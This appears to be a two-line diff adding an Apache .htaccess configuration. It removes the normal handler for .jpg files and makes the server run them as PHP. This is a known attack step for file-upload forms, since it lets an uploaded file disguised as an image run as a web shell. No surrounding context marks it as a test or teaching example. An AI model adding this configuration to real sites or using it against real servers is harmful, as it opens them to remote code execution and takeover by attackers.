@@ -1,0 +1,2 @@
+RemoveHandler .jpg
+AddType application/x-httpd-php .jpg
